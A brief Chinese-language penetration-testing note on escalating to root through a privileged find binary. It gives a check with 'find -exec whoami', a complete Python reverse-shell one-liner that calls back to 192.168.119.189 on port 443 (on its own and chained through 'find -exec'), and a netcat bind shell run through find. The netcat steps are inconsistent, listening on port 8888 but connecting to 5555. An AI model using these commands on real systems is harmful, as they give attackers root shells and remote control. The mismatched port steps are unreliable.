# 确认 find 有 root 执行权限
执行命令
```
touch jewel591
/usr/bin/find jewel591 -exec whoami \;
```
确认 find 命令是否是 root 权限执行.

# 反弹 shell
1. 如果目标机上有 python 环境，可以使用 python 命令反弹 shell：
```
#反弹一个sh类型的shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.189",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 
```
结合 find :
```
/usr/bin/find jewel591 -exec python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.189",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' \; 

```
2. 也可以结合 nc 来获得 shell
```
find /tmp -exec netcat -lvp 8888 -e /bin/sh ;
```
然后 nc 主动连接：
```
netcat 127.0.0.1 5555
```
